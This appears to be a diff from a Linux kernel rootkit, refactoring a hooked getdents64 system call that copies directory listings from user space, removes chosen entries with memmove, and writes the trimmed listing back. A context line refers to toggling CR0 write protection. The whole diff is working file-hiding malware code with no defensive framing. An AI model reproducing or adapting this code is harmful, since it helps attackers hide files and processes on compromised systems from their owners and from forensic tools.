@@ -30,7 +30,7 @@ static inline void one_cr0(void) {
 
 int new_getdents64(const struct pt_regs *regs) {
     int total_bytes_read = original_getdents64_ptr(regs);
-    struct linux_dirent64 *buff = (struct linux_dirent64*)regs->si;
+    void *buff_pointer = (void*)regs->si;
 
     bool has_been_found = false;
     void *first;
@@ -38,7 +38,7 @@ int new_getdents64(const struct pt_regs *regs) {
     if (total_bytes_read > 0) {
         first = kmalloc(total_bytes_read, GFP_KERNEL);
 
-        int copy_res = copy_from_user((void *)first, buff, (unsigned long)total_bytes_read);
+        int copy_res = copy_from_user((void *)first, buff_pointer, (unsigned long)total_bytes_read);
         if (copy_res) {
             printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
             return total_bytes_read;
@@ -58,7 +58,7 @@ int new_getdents64(const struct pt_regs *regs) {
                 total_bytes_read -= curr->d_reclen;
                 
                 void *next_pos = first + i + curr->d_reclen;
-                memmove((void*)curr, (void*)next_pos, length_to_copy);
+                memmove((void*)curr, next_pos, length_to_copy);
                 continue;
             }
 
@@ -67,7 +67,7 @@ int new_getdents64(const struct pt_regs *regs) {
     }
 
     if (has_been_found) {
-        copy_to_user((void*)buff, (void*)first, total_bytes_read);
+        copy_to_user(buff_pointer, first, total_bytes_read);
     }
 
     return total_bytes_read;
